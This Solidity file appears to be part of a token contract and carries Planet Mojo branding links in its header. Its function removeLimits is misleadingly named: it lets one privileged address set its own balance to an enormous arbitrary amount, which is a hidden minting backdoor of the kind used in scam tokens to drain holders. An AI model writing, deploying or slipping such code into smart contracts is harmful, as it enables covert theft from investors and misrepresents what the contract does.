/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.planetmojo.io/
 * Twitter: https://twitter.com/WeArePlanetMojo
 * Telegram: https://t.me/planetmojochat
 * Discord Chat: https://discord.com/invite/PlanetMojo
 * Medium: https://medium.com/planet-mojo-blog
 */
pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
